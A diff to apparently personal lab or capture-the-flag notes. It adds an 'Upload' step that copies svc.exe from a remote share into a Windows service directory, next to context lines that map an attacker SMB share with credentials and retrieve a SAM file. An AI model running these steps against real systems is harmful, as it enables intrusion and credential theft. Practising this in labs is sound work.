@@ -13,6 +13,20 @@ On target machine:
 net use m: \\192.168.45.241\test /user:saitama saitama
 ```
 
+## Upload
+
+On target system.
+
+```
+net use 
+```
+
+```
+copy \\TSCLIENT\test\svc.exe C:\Windows\THMSVC\svc.exe
+```
+
+---
+
 Downloaded SAM file on local machine.
 
 ```
